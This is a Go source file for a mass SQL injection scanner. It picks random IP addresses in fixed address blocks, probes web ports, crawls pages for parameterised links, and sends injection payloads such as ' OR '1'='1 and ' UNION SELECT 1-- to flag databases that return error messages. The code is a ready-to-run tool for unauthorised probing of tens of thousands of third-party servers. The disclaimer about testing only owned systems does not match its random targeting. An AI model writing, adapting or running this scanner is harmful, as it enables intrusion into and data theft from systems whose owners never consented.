package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

// Network blocks from the original script
var networkBlocks = []int{13, 18, 20, 34, 35, 40, 52, 54, 104, 134, 137, 139, 159}

// Ports to scan
var targetPorts = []int{80, 81, 443, 8080, 8443, 8000, 8888, 8880, 7001, 9000}

// HTTPS ports
var httpsPort = map[int]bool{443: true, 8443: true, 7001: true}

// SQL error patterns that indicate potential vulnerabilities
var sqlErrorPatterns = []*regexp.Regexp{
	// MySQL errors
	regexp.MustCompile(`(?i)MySQL.*error`),
	regexp.MustCompile(`(?i)mysql_fetch_array`),
	regexp.MustCompile(`(?i)mysql_num_rows`),
	regexp.MustCompile(`(?i)mysql_query`),
	regexp.MustCompile(`(?i)You have an error in your SQL syntax`),
	regexp.MustCompile(`(?i)supplied argument is not a valid MySQL`),
	
	// PostgreSQL errors
	regexp.MustCompile(`(?i)PostgreSQL.*error`),
	regexp.MustCompile(`(?i)pg_query`),
	regexp.MustCompile(`(?i)pg_exec`),
	regexp.MustCompile(`(?i)Query failed.*ERROR`),
	
	// MSSQL errors
	regexp.MustCompile(`(?i)Microsoft.*ODBC.*SQL Server`),
	regexp.MustCompile(`(?i)OLE DB.*SQL Server`),
	regexp.MustCompile(`(?i)SQLServer JDBC Driver`),
	regexp.MustCompile(`(?i)SqlException`),
	regexp.MustCompile(`(?i)System\.Data\.SqlClient\.SqlException`),
	regexp.MustCompile(`(?i)Unclosed quotation mark after the character string`),
	
	// Oracle errors
	regexp.MustCompile(`(?i)ORA-[0-9]+`),
	regexp.MustCompile(`(?i)Oracle.*Driver`),
	regexp.MustCompile(`(?i)Oracle.*Error`),
	
	// Generic SQL errors
	regexp.MustCompile(`(?i)SQL.*syntax.*error`),
	regexp.MustCompile(`(?i)syntax error.*unexpected`),
	regexp.MustCompile(`(?i)Warning.*mysql_`),
	regexp.MustCompile(`(?i)Warning.*pg_`),
	regexp.MustCompile(`(?i)Fatal error.*SQL`),
	regexp.MustCompile(`(?i)Incorrect syntax near`),
	regexp.MustCompile(`(?i)unexpected end of SQL command`),
	
	// ASP.NET SQL errors
	regexp.MustCompile(`(?i)System\.Data\.SqlClient`),
	regexp.MustCompile(`(?i)System\.Data\.OleDb`),
	regexp.MustCompile(`(?i)Microsoft JET Database Engine`),
	
	// PHP SQL errors
	regexp.MustCompile(`(?i)Warning.*mysql.*on line`),
	regexp.MustCompile(`(?i)mysql_connect.*failed`),
	regexp.MustCompile(`(?i)Call to undefined function.*mysql`),
}

// Common vulnerable parameters to test
var vulnParams = []string{
	"id", "user_id", "userid", "user", "username",
	"page_id", "pageid", "page", "cat", "category", "catid",
	"news_id", "newsid", "article_id", "articleid",
	"product_id", "productid", "item_id", "itemid",
	"post_id", "postid", "blog_id", "blogid",
	"member_id", "memberid", "account_id", "accountid",
	"file_id", "fileid", "doc_id", "docid",
	"search", "q", "query", "keyword", "term",
	"year", "month", "date", "sort", "order",
}

// SQL injection test payloads (basic detection)
var testPayloads = []string{
	"'", // Single quote
	"\"", // Double quote  
	"')", // Single quote with parenthesis
	"';", // Single quote with semicolon
	"' OR '1'='1", // Classic SQLi
	"\" OR \"1\"=\"1", // Double quote variant
	"' OR 1=1--", // Comment variant
	"' UNION SELECT 1--", // Union variant
	"\\'", // Escaped quote
	"1'", // Numeric with quote
	"-1'", // Negative with quote
	"999999'", // Large number with quote
}

// generateRandomIP creates a random IP from predefined network blocks
func generateRandomIP() string {
	block := networkBlocks[rand.Intn(len(networkBlocks))]
	octet2 := rand.Intn(256)
	octet3 := rand.Intn(256)
	octet4 := rand.Intn(254) + 1
	return fmt.Sprintf("%d.%d.%d.%d", block, octet2, octet3, octet4)
}

// scanPort checks if a specific port is open on the given IP
func scanPort(ip string, port int, timeout time.Duration) bool {
	address := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}

// scanIP scans all target ports on an IP concurrently and returns open ports
func scanIP(ip string) []int {
	var openPorts []int
	var mu sync.Mutex
	var wg sync.WaitGroup
	timeout := 500 * time.Millisecond

	for _, port := range targetPorts {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			if scanPort(ip, p, timeout) {
				mu.Lock()
				openPorts = append(openPorts, p)
				mu.Unlock()
			}
		}(port)
	}

	wg.Wait()
	return openPorts
}

// Global HTTP client
var httpClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:          200,
		MaxIdleConnsPerHost:   200,
		IdleConnTimeout:       30 * time.Second,
		DisableKeepAlives:     false,
		TLSHandshakeTimeout:   1 * time.Second,
		ResponseHeaderTimeout: 3 * time.Second,
		Dial: (&net.Dialer{
			Timeout: 500 * time.Millisecond,
		}).Dial,
	},
	Timeout: 4 * time.Second, // Longer timeout for error detection
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 3 {
			return fmt.Errorf("stopped after 3 redirects")
		}
		return nil
	},
}

// VulnResult contains information about a potential SQL injection vulnerability
type VulnResult struct {
	URL            string
	Parameter      string
	Payload        string
	ErrorPattern   string
	ResponseLength int
	StatusCode     int
	Framework      string
	Severity       string
}

// detectWebFramework identifies the web framework/technology
func detectWebFramework(content, headers string) string {
	combined := strings.ToLower(content + " " + headers)
	
	if strings.Contains(combined, "asp.net") || strings.Contains(combined, "aspx") {
		return "ASP.NET"
	} else if strings.Contains(combined, "wordpress") || strings.Contains(combined, "wp-content") {
		return "WordPress"
	} else if strings.Contains(combined, "laravel") {
		return "Laravel"
	} else if strings.Contains(combined, "drupal") {
		return "Drupal"
	} else if strings.Contains(combined, "joomla") {
		return "Joomla"
	} else if strings.Contains(combined, "php") {
		return "PHP"
	} else if strings.Contains(combined, "node") || strings.Contains(combined, "express") {
		return "Node.js"
	} else if strings.Contains(combined, "python") || strings.Contains(combined, "django") || strings.Contains(combined, "flask") {
		return "Python"
	} else if strings.Contains(combined, "java") || strings.Contains(combined, "jsp") {
		return "Java"
	}
	return "Unknown"
}

// checkForWebApp checks if the site has a web application with parameters
func checkForWebApp(ip string, port int) (bool, []string, string) {
	protocol := "http"
	if httpsPort[port] {
		protocol = "https"
	}

	baseURL := fmt.Sprintf("%s://%s:%d", protocol, ip, port)
	
	// Test common paths that often have parameters
	testPaths := []string{
		"/",
		"/index.php",
		"/index.aspx", 
		"/default.php",
		"/default.aspx",
		"/home.php",
		"/main.php",
		"/page.php",
		"/news.php",
		"/product.php",
		"/article.php",
		"/view.php",
		"/show.php",
		"/detail.php",
		"/content.php",
	}

	var foundURLs []string
	var framework string

	for _, path := range testPaths {
		url := baseURL + path
		resp, err := httpClient.Get(url)
		if err != nil {
			continue
		}
		
		if resp.StatusCode == 200 {
			buf := make([]byte, 4096)
			n, _ := resp.Body.Read(buf)
			content := string(buf[:n])
			
			// Get headers as string
			var headerStr strings.Builder
			for key, values := range resp.Header {
				for _, value := range values {
					headerStr.WriteString(fmt.Sprintf("%s: %s ", key, value))
				}
			}
			
			if framework == "" {
				framework = detectWebFramework(content, headerStr.String())
			}
			
			// Look for links with parameters
			linkRegex := regexp.MustCompile(`(?i)href=["']([^"']*\?[^"']*id=\d+[^"']*)["']`)
			matches := linkRegex.FindAllStringSubmatch(content, -1)
			
			for _, match := range matches {
				if len(match) > 1 {
					foundURLs = append(foundURLs, baseURL+match[1])
				}
			}
			
			// Look for form actions with parameters
			formRegex := regexp.MustCompile(`(?i)action=["']([^"']*\?[^"']*)["']`)
			formMatches := formRegex.FindAllStringSubmatch(content, -1)
			
			for _, match := range formMatches {
				if len(match) > 1 {
					foundURLs = append(foundURLs, baseURL+match[1])
				}
			}
		}
		resp.Body.Close()
		
		// Limit to first few paths for speed
		if len(foundURLs) > 0 {
			break
		}
	}

	return len(foundURLs) > 0, foundURLs, framework
}

// testSQLInjection tests a URL for SQL injection vulnerabilities
func testSQLInjection(testURL, framework string) []VulnResult {
	var vulnerabilities []VulnResult
	
	// Parse URL to get parameters
	parts := strings.Split(testURL, "?")
	if len(parts) != 2 {
		return vulnerabilities
	}
	
	baseURL := parts[0]
	params := parts[1]
	
	// Parse parameters
	paramPairs := strings.Split(params, "&")
	
	for _, pair := range paramPairs {
		keyValue := strings.Split(pair, "=")
		if len(keyValue) != 2 {
			continue
		}
		
		param := keyValue[0]
		originalValue := keyValue[1]
		
		// Test different payloads for this parameter
		for _, payload := range testPayloads {
			// Build test URL
			testValue := originalValue + payload
			var newParams []string
			
			for _, p := range paramPairs {
				kv := strings.Split(p, "=")
				if len(kv) == 2 {
					if kv[0] == param {
						newParams = append(newParams, fmt.Sprintf("%s=%s", kv[0], testValue))
					} else {
						newParams = append(newParams, p)
					}
				}
			}
			
			vulnTestURL := baseURL + "?" + strings.Join(newParams, "&")
			
			// Make request
			resp, err := httpClient.Get(vulnTestURL)
			if err != nil {
				continue
			}
			
			// Read response
			buf := make([]byte, 16384) // Larger buffer to catch error messages
			n, _ := resp.Body.Read(buf)
			content := string(buf[:n])
			resp.Body.Close()
			
			// Check for SQL error patterns
			for _, pattern := range sqlErrorPatterns {
				if pattern.MatchString(content) {
					severity := "Medium"
					if strings.Contains(payload, "UNION") || strings.Contains(payload, "OR") {
						severity = "High"
					} else if payload == "'" || payload == "\"" {
						severity = "Critical"
					}
					
					vulnerabilities = append(vulnerabilities, VulnResult{
						URL:            vulnTestURL,
						Parameter:      param,
						Payload:        payload,
						ErrorPattern:   pattern.String(),
						ResponseLength: n,
						StatusCode:     resp.StatusCode,
						Framework:      framework,
						Severity:       severity,
					})
					break // Don't test more payloads for this param if we found one
				}
			}
			
			// Small delay between tests
			time.Sleep(100 * time.Millisecond)
		}
	}
	
	return vulnerabilities
}

// findVulnerableURLs discovers URLs with parameters that might be vulnerable
func findVulnerableURLs(ip string, port int, framework string) []VulnResult {
	var allVulnerabilities []VulnResult
	
	protocol := "http"
	if httpsPort[port] {
		protocol = "https"
	}
	
	baseURL := fmt.Sprintf("%s://%s:%d", protocol, ip, port)
	
	// Common vulnerable endpoints based on framework
	var testEndpoints []string
	
	if framework == "ASP.NET" {
		testEndpoints = []string{
			"/default.aspx?id=1",
			"/product.aspx?id=1",
			"/news.aspx?id=1", 
			"/article.aspx?id=1",
			"/page.aspx?id=1",
			"/view.aspx?id=1",
			"/show.aspx?id=1",
			"/details.aspx?id=1",
			"/category.aspx?cat=1",
			"/search.aspx?q=test",
		}
	} else if framework == "WordPress" || framework == "PHP" {
		testEndpoints = []string{
			"/index.php?id=1",
			"/page.php?id=1",
			"/post.php?id=1",
			"/product.php?id=1",
			"/news.php?id=1",
			"/article.php?id=1",
			"/view.php?id=1",
			"/show.php?id=1",
			"/category.php?cat=1",
			"/search.php?q=test",
			"/?p=1", // WordPress permalink
			"/?page_id=1", // WordPress page
		}
	} else {
		// Generic endpoints
		testEndpoints = []string{
			"/?id=1",
			"/index?id=1",
			"/page?id=1",
			"/view?id=1",
			"/show?id=1",
			"/product?id=1",
			"/article?id=1",
			"/news?id=1",
		}
	}
	
	// Test each endpoint
	for _, endpoint := range testEndpoints {
		testURL := baseURL + endpoint
		vulnerabilities := testSQLInjection(testURL, framework)
		allVulnerabilities = append(allVulnerabilities, vulnerabilities...)
		
		// Delay between endpoint tests
		time.Sleep(200 * time.Millisecond)
	}
	
	return allVulnerabilities
}

// worker processes IPs concurrently
func worker(jobs <-chan string, results chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()

	for ip := range jobs {
		openPorts := scanIP(ip)

		for _, port := range openPorts {
			// Check if it's a web application
			hasWebApp, urls, framework := checkForWebApp(ip, port)
			
			if hasWebApp || framework != "Unknown" {
				protocol := "http"
				if httpsPort[port] {
					protocol = "https"
				}
				
				var allVulns []VulnResult
				
				// Test discovered URLs
				for _, url := range urls {
					vulns := testSQLInjection(url, framework)
					allVulns = append(allVulns, vulns...)
				}
				
				// Test common vulnerable endpoints
				vulns := findVulnerableURLs(ip, port, framework)
				allVulns = append(allVulns, vulns...)
				
				// Report findings
				if len(allVulns) > 0 {
					for _, vuln := range allVulns {
						msg := fmt.Sprintf("[SQL VULN %s] %s | Param: %s | Payload: %s | Framework: %s | Status: %d",
							vuln.Severity, vuln.URL, vuln.Parameter, vuln.Payload, vuln.Framework, vuln.StatusCode)
						results <- msg
					}
				} else if framework != "Unknown" {
					// Report web app without vulnerabilities found
					results <- fmt.Sprintf("[WEB APP - NO SQLI] %s://%s:%d | %s", protocol, ip, port, framework)
				}
			}
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	const (
		totalScans     = 99999
		maxConcurrency = 50 // Reduced for more thorough testing
	)

	timestamp := time.Now().Format("2006-01-02_15-04-05")
	filename := fmt.Sprintf("sql_vuln_results_%s.txt", timestamp)

	file, err := os.Create(filename)
	if err != nil {
		fmt.Printf("Error creating results file: %v\n", err)
		return
	}
	defer file.Close()

	header := fmt.Sprintf("SQL Injection Vulnerability Scanner Results - %s\nScanning %d random IPs with %d concurrent workers\nTesting for SQL injection vulnerabilities\nFrameworks: ASP.NET, PHP, WordPress, Laravel, Drupal, Joomla, and more\nPayloads: %d different SQL injection tests per parameter\n%s\n\n",
		time.Now().Format("2006-01-02 15:04:05"), totalScans, maxConcurrency, len(testPayloads), strings.Repeat("=", 80))
	file.WriteString(header)

	fmt.Printf("💉 SQL INJECTION VULNERABILITY SCANNER STARTING...\nResults will be saved to: %s\n\n", filename)
	fmt.Printf("⚠️  WARNING: This scanner tests for SQL injection vulnerabilities\n")
	fmt.Printf("🔍 Testing %d payloads per vulnerable parameter found\n\n", len(testPayloads))

	jobs := make(chan string, maxConcurrency)
	results := make(chan string, maxConcurrency)

	var foundCount int64
	var scannedCount int64
	var statsMu sync.Mutex

	// Start worker goroutines
	var wg sync.WaitGroup
	for i := 0; i < maxConcurrency; i++ {
		wg.Add(1)
		go worker(jobs, results, &wg)
	}

	// Result handler
	var resultWg sync.WaitGroup
	resultWg.Add(1)
	go func() {
		defer resultWg.Done()
		for result := range results {
			fmt.Println(result)
			file.WriteString(result + "\n")
			statsMu.Lock()
			foundCount++
			statsMu.Unlock()
		}
	}()

	// Progress tracking
	go func() {
		ticker := time.NewTicker(15 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				statsMu.Lock()
				fmt.Printf("💉 SQL VULN Progress: %d IPs scanned, %d potential vulnerabilities found\n", scannedCount, foundCount)
				statsMu.Unlock()
			default:
				time.Sleep(100 * time.Millisecond)
			}
		}
	}()

	// Job generator
	go func() {
		defer close(jobs)
		for i := 0; i < totalScans; i++ {
			jobs <- generateRandomIP()
			statsMu.Lock()
			scannedCount++
			statsMu.Unlock()
		}
	}()

	wg.Wait()
	close(results)
	resultWg.Wait()

	footer := fmt.Sprintf("\n%s\n💉 SQL VULNERABILITY SCAN COMPLETE: %s\nTotal IPs scanned: %d\nPotential vulnerabilities found: %d\n\n⚠️  DISCLAIMER: These are potential vulnerabilities based on error patterns.\n   Manual verification is required for confirmation.\n   Use responsibly and only on systems you own or have permission to test.\n",
		strings.Repeat("=", 80), time.Now().Format("2006-01-02 15:04:05"), scannedCount, foundCount)
	file.WriteString(footer)

	fmt.Printf("\n🎯 SQL VULNERABILITY SCAN COMPLETE!\n📊 Total IPs scanned: %d\n⚠️  Potential vulnerabilities found: %d\n💾 Results saved to: %s\n", 
		scannedCount, foundCount, filename)
	
	fmt.Printf("\n⚠️  IMPORTANT: Use these results responsibly and only test systems you own!\n")
}
